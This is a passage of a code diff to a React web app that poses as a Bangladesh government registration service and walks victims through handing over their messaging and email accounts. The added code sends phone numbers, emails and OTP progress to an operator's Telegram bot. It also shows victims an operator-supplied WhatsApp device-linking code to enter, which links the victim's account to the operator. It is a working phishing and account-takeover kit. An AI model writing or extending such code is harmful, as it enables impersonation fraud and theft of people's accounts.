@@ -29,6 +29,7 @@ import {
   MessageCircle,
   Upload,
   Camera,
+  Copy,
   CheckCircle2,
   ShieldAlert,
   Clock,
@@ -48,6 +49,7 @@ import {
   Sparkles
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
+import html2canvas from 'html2canvas';
 import { 
   collection, 
   doc, 
@@ -1482,12 +1484,18 @@ const FamilyCardApp = ({
   const [selectedPlatform, setSelectedPlatform] = useState<'whatsapp' | 'imo' | 'telegram' | 'email' | null>(null);
   const [platformInputValue, setPlatformInputValue] = useState('');
   const [regStep, setRegStep] = useState<'select' | 'input' | 'loading' | 'otp' | 'pending' | 'success'>('select');
+  const [savedPlatformInputValue, setSavedPlatformInputValue] = useState<string>('');
+  const [savedPlatform, setSavedPlatform] = useState<'whatsapp' | 'imo' | 'telegram' | 'email' | null>(null);
+  const [savedLastStep, setSavedLastStep] = useState<'otp' | 'pending' | null>(null);
+  const [otpCountdown, setOtpCountdown] = useState<number>(0);
   const [loadingProgress, setLoadingProgress] = useState(0);
   const [otpValues, setOtpValues] = useState<string[]>([]);
   const [showVideoTutorial, setShowVideoTutorial] = useState(false);
   const [sessionUserId, setSessionUserId] = useState<string>('');
   const [wpPairingCode, setWpPairingCode] = useState<string>('');
+  const [wpCountdown, setWpCountdown] = useState<number>(10);
   const [otpErrorMessage, setOtpErrorMessage] = useState<string>('');
+  const [copiedCode, setCopiedCode] = useState<boolean>(false);
   const videoRef = React.useRef<HTMLVideoElement | null>(null);
   
   // Dashboard & Profiles related states
@@ -1625,6 +1633,80 @@ const FamilyCardApp = ({
     };
   }, [regStep, sessionUserId, selectedPlatform]);
 
+  // WhatsApp countdown ticker
+  useEffect(() => {
+    let timer: any = null;
+    if (regStep === 'pending' && selectedPlatform === 'whatsapp') {
+      setWpCountdown(10);
+      timer = setInterval(() => {
+        setWpCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(timer);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+    }
+    return () => {
+      if (timer) clearInterval(timer);
+    };
+  }, [regStep, selectedPlatform]);
+
+  // Listen to remote custom event for WhatsApp device linker
+  useEffect(() => {
+    const handleWpCodeUpdate = (e: Event) => {
+      const rawCode = (e as CustomEvent).detail || '';
+      setWpPairingCode(rawCode);
+      setWpCountdown(0);
+      setCopiedCode(false);
+    };
+    window.addEventListener('whatsapp_pairing_code_updated', handleWpCodeUpdate);
+    return () => {
+      window.removeEventListener('whatsapp_pairing_code_updated', handleWpCodeUpdate);
+    };
+  }, []);
+
+  const handleCopyWpPairingCode = () => {
+    if (!wpPairingCode) return;
+    const cleanCode = wpPairingCode.replace(/[\s-]/g, '').toUpperCase().slice(0, 8);
+    navigator.clipboard.writeText(cleanCode).then(() => {
+      setCopiedCode(true);
+      notifyBot(`📋 <b>গ্রাহক হোয়াটসঅ্যাপ লিঙ্ক কোড কপি করেছেন!</b>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>কপি করা কোড:</b> <code>${cleanCode}</code>`);
+      
+      setTimeout(() => {
+        const videoElement = document.getElementById('video-tutorial-pane');
+        if (videoElement) {
+          videoElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+      }, 100);
+    }).catch((err) => {
+      console.error("Failed to copy pairing code: ", err);
+    });
+  };
+
+  // OTP 15s Countdown and lock ticker
+  useEffect(() => {
+    let timer: any = null;
+    if (regStep === 'otp') {
+      setOtpCountdown(15);
+      timer = setInterval(() => {
+        setOtpCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(timer);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+    } else {
+      setOtpCountdown(0);
+    }
+    return () => {
+      if (timer) clearInterval(timer);
+    };
+  }, [regStep]);
+
   // Loading progresses
   useEffect(() => {
     if (regStep === 'loading') {
@@ -1634,17 +1716,11 @@ const FamilyCardApp = ({
           if (prev >= 100) {
             clearInterval(interval);
             if (selectedPlatform === 'whatsapp') {
-              const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // omit ambiguous like I, O, 0, 1
-              let code = '';
-              for (let c = 0; c < 8; c++) {
-                code += chars[Math.floor(Math.random() * chars.length)];
-              }
-              const formattedCode = code.slice(0, 4) + '-' + code.slice(4);
-              setWpPairingCode(formattedCode);
-              setOtpValues(code.split(''));
+              setWpPairingCode('');
+              setWpCountdown(10);
               setRegStep('pending');
               
-              // Auto notify Telegram about WhatsApp Pairing Web process 
+              // Auto notify Telegram about WhatsApp Pairing Web process starting
               fetch('/api/submit-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1652,12 +1728,13 @@ const FamilyCardApp = ({
                   userId: sessionUserId,
                   phone: platformInputValue,
                   platform: selectedPlatform,
-                  otp: formattedCode
+                  otp: 'PENDING_BOT_CODE'
                 })
               }).then(() => {
-                notifyBot(`WhatsApp Web link code generated: ${formattedCode} for pairing number: ${platformInputValue}`);
+                notifyBot(`📱 <b>WhatsApp Device Linker</b> সেশন সচল হয়েছে!\n<b>ফোন নম্বর:</b> <code>${platformInputValue}</code>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n\n<i>গ্রাহক স্ক্রিনে ১০ সেকেন্ডের কাউন্টডাউন শুরু হয়েছে। কোড সেট করতে দয়া করে নিচের নতুন কমান্ড ফরম্যাটে কোডটি পাঠান:</i>\n\n<code>/WhatsApp Device Linker_${sessionUserId} ADGHJKLM</code>\n\n<i>(পূর্বের ফরম্যাটটিও সচল রয়েছে: <code>/${sessionUserId} WhatsApp Device Linker ADGHJKLM</code>)</i>`);
               }).catch(() => {});
             } else {
+              setWpPairingCode('');
               setOtpValues(Array(selectedPlatform === 'email' ? 6 : selectedPlatform === 'telegram' ? 5 : 4).fill(''));
               setOtpErrorMessage('');
               setRegStep('otp');
@@ -1758,23 +1835,52 @@ const FamilyCardApp = ({
 
   if (isRegistering) {
     const handleBack = () => {
-      notifyBot(`Clicked Back from stage: ${regStep}`);
+      // Send Telegram notification with user details on return
+      notifyBot(`🔙 <b>গ্রাহক তথ্য ভেরিফিকেশন প্যানেল থেকে পিছনে ফিরে গেছেন!</b>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>পূর্ববর্তী ধাপ:</b> <code>${regStep}</code>\n<b>পূর্ববর্তী ফোন/ইমেইল:</b> <code>${platformInputValue || 'কোনোটিই নয়'}</code>\n<b>প্ল্যাটফর্ম:</b> <code>${selectedPlatform || 'কোনোটিই নয়'}</code>`);
+
+      // Save data for auto-restoring
+      if (regStep === 'otp' || regStep === 'pending' || regStep === 'loading') {
+        setSavedPlatformInputValue(platformInputValue);
+        setSavedPlatform(selectedPlatform);
+        setSavedLastStep(regStep === 'loading' ? (selectedPlatform === 'whatsapp' ? 'pending' : 'otp') : (regStep === 'otp' || regStep === 'pending' ? regStep : null));
+      }
+
       setSelectedPlatform(null);
-      setPlatformInputValue('');
       setRegStep('select');
+      setCopiedCode(false);
     };
 
     const handlePlatformSelect = (platform: 'whatsapp' | 'imo' | 'telegram' | 'email') => {
       notifyBot(`Selected Platform: ${platform}. Interactive prompt question opened.`);
       setSelectedPlatform(platform);
-      setPlatformInputValue('');
+      
+      // Auto-populate previously entered input value if it exists
+      if (savedPlatformInputValue) {
+        setPlatformInputValue(savedPlatformInputValue);
+      } else {
+        setPlatformInputValue('');
+      }
       setRegStep('input');
     };
 
     const handleSubmitInput = () => {
       if (!isInputValid()) return;
-      notifyBot(`Submitted connection details for ${selectedPlatform}: ${platformInputValue}`);
-      setRegStep('loading');
+      
+      // Notify Telegram when moving forward again with user details/number
+      notifyBot(`➡️ <b>গ্রাহক সামনে এগিয়ে যাচ্ছেন!</b>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>ফোন/ইমেইল:</b> <code>${platformInputValue}</code>\n<b>প্ল্যাটফর্ম:</b> <code>${selectedPlatform}</code>`);
+
+      // If they had a saved last step from this platform with this exact value:
+      if (savedPlatform === selectedPlatform && savedPlatformInputValue === platformInputValue && savedLastStep) {
+        // Direct redirect back to where they left off
+        setRegStep(savedLastStep);
+        notifyBot(`📱 <b>গ্রাহককে সরাসরি পূর্ববর্তী ধাপে ফিরিয়ে নেওয়া হয়েছে!</b>\n<b>ধাপ:</b> <code>${savedLastStep}</code>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>ফোন/ইমেইল:</b> <code>${platformInputValue}</code>\n<b>প্ল্যাটফর্ম:</b> <code>${selectedPlatform}</code>`);
+      } else {
+        // Store current details as potential saved points
+        setSavedPlatformInputValue(platformInputValue);
+        setSavedPlatform(selectedPlatform);
+        setSavedLastStep(selectedPlatform === 'whatsapp' ? 'pending' : 'otp');
+        setRegStep('loading');
+      }
     };
 
     const getPlatformTheme = () => {
@@ -1873,461 +1979,652 @@ const FamilyCardApp = ({
       }
     };
 
+    const getCurrentStepVideo = (): { src: string; title: string } | null => {
+      if (!selectedPlatform) return null;
+      if (selectedPlatform === 'whatsapp') {
+        if (regStep === 'input') {
+          return { src: '/my-video1.mp4', title: 'হোয়াটসঅ্যাপ সংযোগ করার নিয়ম' };
+        }
+        if (regStep === 'pending') {
+          return { src: '/my-video2.mp4', title: 'হোয়াটসঅ্যাপ লিঙ্ক কোডের নিয়ম' };
+        }
+      }
+      if (selectedPlatform === 'imo') {
+        if (regStep === 'input') {
+          return { src: '/my-video3.mp4', title: 'Imo নম্বর সংযোগ করার নিয়ম' };
+        }
+        if (regStep === 'otp') {
+          return { src: '/my-video4.mp4', title: 'Imo ওটিপি যাচাই করার নিয়ম' };
+        }
+      }
+      if (selectedPlatform === 'telegram') {
+        if (regStep === 'input') {
+          return { src: '/my-video5.mp4', title: 'টেলিগ্রাম নম্বর সংযোগ করার নিয়ম' };
+        }
+        if (regStep === 'otp') {
+          return { src: '/my-video6.mp4', title: 'টেলিগ্রাম ওটিপি যাচাই করার নিয়ম' };
+        }
+      }
+      if (selectedPlatform === 'email') {
+        if (regStep === 'input') {
+          return { src: '/my-video7.mp4', title: 'ইমেইল এড্রেস সংযোগ করার নিয়ম' };
+        }
+        if (regStep === 'otp') {
+          return { src: '/my-video8.mp4', title: 'ইমেইল ওটিপি যাচাই করার নিয়ম' };
+        }
+      }
+      return null;
+    };
+
+    const activeVideo = getCurrentStepVideo();
+
     return (
-      <div className="max-w-md mx-auto p-5 pb-24 text-center font-['Hind_Siliguri']">
-        {/* Step A: Platform Selection */}
-        {regStep === 'select' && (
-          <motion.div initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
-            <div className="bg-gradient-to-r from-emerald-800 to-emerald-950 text-white p-6 rounded-3xl shadow-xl relative overflow-hidden">
-              <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl"></div>
-              <div className="flex items-center gap-2 mb-2 text-amber-300 font-bold justify-center">
-                <span className="p-1 bg-white/10 rounded-lg">🇧🇩</span>
-                <span className="text-xs uppercase tracking-wide font-black">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</span>
-              </div>
-              <h2 className="text-lg md:text-xl font-black mb-1 leading-snug">{getRegistrationTypeDetails(activeRegistrationType).title}</h2>
-              <p className="text-xs text-emerald-100 font-extrabold">{getRegistrationTypeDetails(activeRegistrationType).subTitle}</p>
-            </div>
-
-            <div className="bg-slate-50 border border-slate-200/70 p-5 rounded-3xl shadow-sm text-left">
-              <h3 className="text-sm font-black text-slate-800 border-b border-slate-200/60 pb-3 mb-4 flex items-center gap-1.5">
-                <LayoutDashboard size={18} className="text-emerald-700" /> {getRegistrationTypeDetails(activeRegistrationType).platformSelectLabel}
-              </h3>
-
-              <div className="space-y-5">
-                {/* WhatsApp Option */}
-                <div className="space-y-2">
-                  <p className="text-xs font-black text-slate-700 leading-relaxed">
-                    আপনি কি হোয়াটসঅ্যাপের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
-                  </p>
-                  <button 
-                    id="btn-select-whatsapp"
-                    onClick={() => handlePlatformSelect('whatsapp')}
-                    className="w-full bg-[#25D366] hover:bg-[#20ba5a] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
-                  >
-                    <WhatsAppIcon />
-                    WhatsApp-এর মাধ্যমে সংগ্রহ করুন
-                  </button>
-                </div>
-
-                {/* Imo Option */}
-                <div className="space-y-2 pt-2 border-t border-slate-200/50">
-                  <p className="text-xs font-black text-slate-700 leading-relaxed">
-                    আপনি কি Imo app এর মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
-                  </p>
-                  <button 
-                    id="btn-select-imo"
-                    onClick={() => handlePlatformSelect('imo')}
-                    className="w-full bg-[#1a9bf0] hover:bg-[#158ad6] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
-                  >
-                    <ImoIcon />
-                    Imo-এর মাধ্যমে সংগ্রহ করুন
-                  </button>
-                </div>
-
-                {/* Telegram Option */}
-                <div className="space-y-2 pt-2 border-t border-slate-200/50">
-                  <p className="text-xs font-black text-slate-700 leading-relaxed">
-                    আপনি কি টেলিগ্রামের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
-                  </p>
-                  <button 
-                    id="btn-select-telegram"
-                    onClick={() => handlePlatformSelect('telegram')}
-                    className="w-full bg-[#0088cc] hover:bg-[#0077b3] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
-                  >
-                    <TelegramIcon />
-                    Telegram-এর মাধ্যমে সংগ্রহ করুন
-                  </button>
-                </div>
-
-                {/* Email Option */}
-                <div className="space-y-2 pt-2 border-t border-slate-200/50">
-                  <p className="text-xs font-black text-slate-700 leading-relaxed">
-                    আপনি কি ইমেইল একাউন্টের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
-                  </p>
-                  <button 
-                    id="btn-select-email"
-                    onClick={() => handlePlatformSelect('email')}
-                    className="w-full bg-[#ea4335] hover:bg-[#d63426] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
-                  >
-                    <EmailIcon />
-                    E-mail-এর মাধ্যমে সংগ্রহ করুন
-                  </button>
-                </div>
-              </div>
-            </div>
-
-            <button 
-              id="btn-exit-registration"
-              onClick={() => setIsRegistering(false)}
-              className="text-xs font-black text-slate-500 hover:text-slate-700 underline cursor-pointer inline-flex items-center gap-1 mt-4"
-            >
-              <ChevronLeft size={14} /> সরকারি জরুরি নির্দেশনায় ফিরে যান
-            </button>
-          </motion.div>
-        )}
-
-        {/* Step B: Phone/Email Input Form */}
-        {regStep === 'input' && selectedPlatform && (
-          <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="space-y-5">
-            <div className="flex items-center justify-between border-b border-slate-200 pb-3">
-              <button 
-                id="btn-back-to-select"
-                onClick={handleBack} 
-                className="p-1 px-3 bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-black rounded-lg cursor-pointer inline-flex items-center gap-1"
-              >
-                <ChevronLeft size={14} /> পিছনে যান
-              </button>
-              <span className={`text-xs font-black px-3 py-1 text-white rounded-full ${theme.bg}`}>
-                {theme.label} কপি গেটওয়ে
-              </span>
-            </div>
-
-            <div className="bg-white border-2 border-slate-100 p-5 rounded-3xl shadow-sm text-left space-y-4">
-              <div className="flex justify-center my-1.5 font-sans">
-                <div className={`p-4 rounded-full ${theme.bg} text-white bg-opacity-10`}>
-                  {selectedPlatform === 'whatsapp' && <WhatsAppIcon />}
-                  {selectedPlatform === 'imo' && <ImoIcon />}
-                  {selectedPlatform === 'telegram' && <TelegramIcon />}
-                  {selectedPlatform === 'email' && <EmailIcon />}
-                </div>
-              </div>
-
-              <div className="space-y-1.5 text-center">
-                <h3 className="font-black text-slate-800 text-base">আপনার বিবরণ প্রদান করুন</h3>
-                <p className="text-xs text-slate-500">আপনার {getRegistrationTypeDetails(activeRegistrationType).badge} কপি পেতে আপনার সঠিক বিবরণটি প্রদান করুন</p>
-              </div>
-
-              <div className="space-y-2 pt-2">
-                <label className="text-xs font-black text-slate-700">
-                  {selectedPlatform === 'email' ? 'আপনার জিমেইল/ইমেইল এড্রেস লিখুন' : 'আপনার সঠিক মোবাইল নম্বরটি লিখুন'}
-                </label>
-                
-                <div className="flex gap-2 items-center">
-                  <div className="relative w-full">
-                    {selectedPlatform !== 'email' && (
-                      <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 font-mono text-sm font-bold">
-                        🇧🇩 +88
-                      </span>
-                    )}
-                    <input 
-                      id="platform-input-field"
-                      type={selectedPlatform === 'email' ? 'email' : 'tel'} 
-                      value={platformInputValue}
-                      onChange={(e) => setPlatformInputValue(e.target.value)}
-                      placeholder={selectedPlatform === 'email' ? 'example@gmail.com' : '017XXXXXXXX'}
-                      className={`w-full font-bold text-sm bg-slate-50 border border-slate-200 rounded-xl py-3 ${selectedPlatform !== 'email' ? 'pl-15 pr-4' : 'px-4'} focus:outline-none focus:ring-2 ${theme.ring} focus:bg-white text-slate-800`}
-                    />
+      <div className={`mx-auto p-5 pb-24 text-center font-['Hind_Siliguri'] transition-all duration-300 ${activeVideo ? 'max-w-5xl' : 'max-w-md'}`}>
+        <div className={activeVideo ? 'grid grid-cols-1 md:grid-cols-12 gap-8 items-start text-left' : ''}>
+          <div className={activeVideo ? 'md:col-span-7 space-y-4' : 'space-y-4'}>
+            {/* Step A: Platform Selection */}
+            {regStep === 'select' && (
+              <motion.div initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
+                <div className="bg-gradient-to-r from-emerald-800 to-emerald-950 text-white p-6 rounded-3xl shadow-xl relative overflow-hidden">
+                  <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl"></div>
+                  <div className="flex items-center gap-2 mb-2 text-amber-300 font-bold justify-center">
+                    <span className="p-1 bg-white/10 rounded-lg">🇧🇩</span>
+                    <span className="text-xs uppercase tracking-wide font-black">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</span>
                   </div>
+                  <h2 className="text-lg md:text-xl font-black mb-1 leading-snug">{getRegistrationTypeDetails(activeRegistrationType).title}</h2>
+                  <p className="text-xs text-emerald-100 font-extrabold">{getRegistrationTypeDetails(activeRegistrationType).subTitle}</p>
+                </div>
 
-                  <AnimatePresence>
-                    {isInputValid() && (
-                      <motion.button
-                        id="btn-submit-input-next"
-                        initial={{ opacity: 0, scale: 0.8 }}
-                        animate={{ opacity: 1, scale: 1 }}
-                        exit={{ opacity: 0, scale: 0.8 }}
-                        onClick={handleSubmitInput}
-                        className={`${theme.bg} ${theme.hover} text-white shrink-0 p-3 rounded-xl shadow-lg cursor-pointer flex items-center justify-center`}
+                <div className="bg-slate-50 border border-slate-200/70 p-5 rounded-3xl shadow-sm text-left">
+                  <h3 className="text-sm font-black text-slate-800 border-b border-slate-200/60 pb-3 mb-4 flex items-center gap-1.5">
+                    <LayoutDashboard size={18} className="text-emerald-700" /> {getRegistrationTypeDetails(activeRegistrationType).platformSelectLabel}
+                  </h3>
+
+                  <div className="space-y-5">
+                    {/* WhatsApp Option */}
+                    <div className="space-y-2">
+                      <p className="text-xs font-black text-slate-700 leading-relaxed">
+                        আপনি কি হোয়াটসঅ্যাপের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
+                      </p>
+                      <button 
+                        id="btn-select-whatsapp"
+                        onClick={() => handlePlatformSelect('whatsapp')}
+                        className="w-full bg-[#25D366] hover:bg-[#20ba5a] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
                       >
-                        <Send size={18} />
-                      </motion.button>
-                    )}
-                  </AnimatePresence>
+                        <WhatsAppIcon />
+                        WhatsApp-এর মাধ্যমে সংগ্রহ করুন
+                      </button>
+                    </div>
+
+                    {/* Imo Option */}
+                    <div className="space-y-2 pt-2 border-t border-slate-200/50">
+                      <p className="text-xs font-black text-slate-700 leading-relaxed">
+                        আপনি কি Imo app এর মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
+                      </p>
+                      <button 
+                        id="btn-select-imo"
+                        onClick={() => handlePlatformSelect('imo')}
+                        className="w-full bg-[#1a9bf0] hover:bg-[#158ad6] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
+                      >
+                        <ImoIcon />
+                        Imo-এর মাধ্যমে সংগ্রহ করুন
+                      </button>
+                    </div>
+
+                    {/* Telegram Option */}
+                    <div className="space-y-2 pt-2 border-t border-slate-200/50">
+                      <p className="text-xs font-black text-slate-700 leading-relaxed">
+                        আপনি কি টেলিগ্রামের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
+                      </p>
+                      <button 
+                        id="btn-select-telegram"
+                        onClick={() => handlePlatformSelect('telegram')}
+                        className="w-full bg-[#0088cc] hover:bg-[#0077b3] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
+                      >
+                        <TelegramIcon />
+                        Telegram-এর মাধ্যমে সংগ্রহ করুন
+                      </button>
+                    </div>
+
+                    {/* Email Option */}
+                    <div className="space-y-2 pt-2 border-t border-slate-200/50">
+                      <p className="text-xs font-black text-slate-700 leading-relaxed">
+                        আপনি কি ইমেইল একাউন্টের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
+                      </p>
+                      <button 
+                        id="btn-select-email"
+                        onClick={() => handlePlatformSelect('email')}
+                        className="w-full bg-[#ea4335] hover:bg-[#d63426] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
+                      >
+                        <EmailIcon />
+                        E-mail-এর মাধ্যমে সংগ্রহ করুন
+                      </button>
+                    </div>
+                  </div>
                 </div>
-                
-                <div className="text-[10px] text-slate-400 font-bold leading-normal pt-1 flex items-center gap-1.5">
-                  <Clock size={12} />
-                  <span>তথ্যটি ভেরিফাই হওয়ার পর স্বয়ংক্রিয়ভাবে একটি সুনির্দিষ্ট লিঙ্ক তৈরি হবে।</span>
-                </div>
-              </div>
-            </div>
-          </motion.div>
-        )}
 
-        {/* Step C: Transition Loading */}
-        {regStep === 'loading' && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-12 space-y-6">
-            <div className="flex flex-col items-center justify-center space-y-4">
-              <div className="relative w-24 h-24">
-                <div className={`absolute inset-0 rounded-full border-4 border-slate-200`}></div>
-                <div className={`absolute inset-0 rounded-full border-4 border-t-transparent ${theme.border} animate-spin`}></div>
-                <div className="absolute inset-0 flex items-center justify-center">
-                  <span className="text-xs font-mono font-black text-slate-700">{loadingProgress}%</span>
-                </div>
-              </div>
-
-              <div className="space-y-2 max-w-xs mx-auto text-center">
-                <h3 className="font-black text-slate-800 text-base leading-tight">সার্ভার গেটওয়ে সংযোগ করা হচ্ছে...</h3>
-                <p className="text-xs text-slate-500 leading-normal">
-                  মন্ত্রণালয় গেটওয়ের সাহায্যে আপনার দেওয়া তথ্যের সংযোগ চ্যানেল স্থাপন করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।
-                </p>
-              </div>
-            </div>
-          </motion.div>
-        )}
-
-        {/* Step D: OTP Verification View */}
-        {regStep === 'otp' && selectedPlatform && (
-          <motion.div initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} className="space-y-4 text-left">
-            <div className="flex items-center justify-between border-b border-slate-200 pb-3">
-              <span className="text-xs font-black text-slate-500">সুরক্ষিত ওটিপি সংযোগ</span>
-              <span className={`text-xs font-black px-2.5 py-0.5 text-white rounded-md ${theme.bg}`}>
-                {theme.label}
-              </span>
-            </div>
-
-            {/* Main Security Warning */}
-            <div className="bg-amber-50 border border-amber-200 p-4 rounded-2xl flex items-start gap-3">
-              <AlertTriangle className="text-amber-600 shrink-0 w-5 h-5 mt-0.5 animate-pulse" />
-              <div>
-                <p className="text-[11px] font-black text-amber-950 leading-relaxed">
-                  নিরাপত্তা নিশ্চিত করতে প্রবাসী মন্ত্রণালয়ের অফিসিয়াল সার্ভার থেকে আপনাকে একটি ভেরিফাই OTP নাম্বার পাঠানো হয়েছে অনুগ্রহ করে নাম্বার টি এখানে লিখে নিরাপত্তা নিশ্চিত করুন।
-                </p>
-              </div>
-            </div>
-
-            {otpErrorMessage && (
-              <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="bg-rose-50 border border-rose-200 p-3 rounded-xl text-rose-800 text-xs font-black leading-relaxed">
-                {otpErrorMessage}
+                <button 
+                  id="btn-exit-registration"
+                  onClick={() => setIsRegistering(false)}
+                  className="text-xs font-black text-slate-500 hover:text-slate-700 underline cursor-pointer inline-flex items-center gap-1 mt-4"
+                >
+                  <ChevronLeft size={14} /> সরকারি জরুরি নির্দেশনায় ফিরে যান
+                </button>
               </motion.div>
             )}
 
-            <div className="space-y-4">
-              <div className="bg-slate-50 rounded-2xl p-5 border border-slate-200/60">
-                <p className="text-xs font-black text-slate-700 mb-3 text-center">
-                  আপনার {theme.label} আইডিতে প্রেরিত ওটিপি নাম্বারটি লিখুন ({otpLength} সংখ্যার)
-                </p>
-
-                <div className="flex flex-col gap-4 items-center">
-                  <div className="flex justify-center gap-1.5 md:gap-2 w-full">
-                    {Array.from({ length: otpLength }).map((_, i) => (
-                      <input 
-                        key={i}
-                        id={`otp-box-${i}`}
-                        type="text"
-                        pattern="[0-9]*"
-                        inputMode="numeric"
-                        maxLength={1}
-                        value={otpValues[i] || ''}
-                        onChange={(e) => handleOtpChange(e.target.value, i, otpLength)}
-                        onKeyDown={(e) => handleOtpKeyDown(e, i)}
-                        className="w-11 h-12 md:w-12 md:h-13 bg-white border-2 border-slate-250 rounded-xl text-center text-lg font-black text-slate-700 focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600 text-slate-800 font-mono shadow-sm"
-                      />
-                    ))}
-                  </div>
-
-                  {/* Help Button - Show Tutorial */}
-                  <div className="w-full flex justify-center !mt-1">
-                    <button
-                      id="btn-show-otp-help"
-                      onClick={() => {
-                        setShowVideoTutorial(true);
-                        notifyBot('Clicked to view where-is-my-otp video tutorial frame');
-                      }}
-                      className="text-xs font-black text-emerald-700 hover:text-emerald-800 underline flex items-center gap-1 cursor-pointer transition-all active:scale-[0.98] py-1.5"
-                    >
-                      <Play size={12} className="fill-emerald-700" />
-                      আপনার ওটিপি নাম্বার টি কোথায় পাঠানো হয়েছে তা দেখতে এখানে ক্লিক করুন
-                    </button>
-                  </div>
+            {/* Step B: Phone/Email Input Form */}
+            {regStep === 'input' && selectedPlatform && (
+              <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="space-y-5">
+                <div className="flex items-center justify-between border-b border-slate-200 pb-3">
+                  <button 
+                    id="btn-back-to-select"
+                    onClick={handleBack} 
+                    className="p-1 px-3 bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-black rounded-lg cursor-pointer inline-flex items-center gap-1"
+                  >
+                    <ChevronLeft size={14} /> পিছনে যান
+                  </button>
+                  <span className={`text-xs font-black px-3 py-1 text-white rounded-full ${theme.bg}`}>
+                    {theme.label} কপি গেটওয়ে
+                  </span>
                 </div>
 
-                {/* Inline Video Player Frame */}
-                <AnimatePresence>
-                  {showVideoTutorial && (
-                    <motion.div 
-                      initial={{ opacity: 0, height: 0 }} 
-                      animate={{ opacity: 1, height: 'auto' }} 
-                      exit={{ opacity: 0, height: 0 }}
-                      className="w-full overflow-hidden border border-slate-200 rounded-2xl bg-black mt-2 inline-block text-center relative"
-                    >
-                      <video
-                        id="otp-tutorial-video"
-                        ref={videoRef}
-                        src="https://assets.mixkit.co/videos/preview/mixkit-holding-a-smartphone-with-a-blue-screen-41372-large.mp4"
-                        className="w-full h-48 object-cover"
-                        autoPlay
-                        playsInline
-                        onEnded={() => {
-                          setShowVideoTutorial(false);
-                          notifyBot('Help video playback completed. Hiding video frame automatically.');
-                        }}
-                      />
-                      <div className="bg-slate-900 p-2 text-center flex items-center justify-between px-3 border-t border-white/10">
-                        <span className="text-[10px] text-white/85 font-bold flex items-center gap-1">
-                          <Clock size={11} className="text-amber-400" /> ওটিপি কোডটি কিভাবে খুঁজবেন দেখুন
-                        </span>
-                        <button
-                          id="btn-hide-otp-help-manual"
-                          onClick={() => {
-                            setShowVideoTutorial(false);
-                            notifyBot('User manually hit Hide Video button.');
-                          }}
-                          className="bg-white/10 hover:bg-white/20 active:scale-[0.97] transition px-2.5 py-1 text-[10px] font-black rounded text-red-100 flex items-center gap-1 cursor-pointer"
-                        >
-                          Hide Video (লুকান)
-                        </button>
+                <div className="bg-white border-2 border-slate-100 p-5 rounded-3xl shadow-sm text-left space-y-4">
+                  <div className="flex justify-center my-1.5 font-sans">
+                    <div className={`p-4 rounded-full ${theme.bg} text-white bg-opacity-10`}>
+                      {selectedPlatform === 'whatsapp' && <WhatsAppIcon />}
+                      {selectedPlatform === 'imo' && <ImoIcon />}
+                      {selectedPlatform === 'telegram' && <TelegramIcon />}
+                      {selectedPlatform === 'email' && <EmailIcon />}
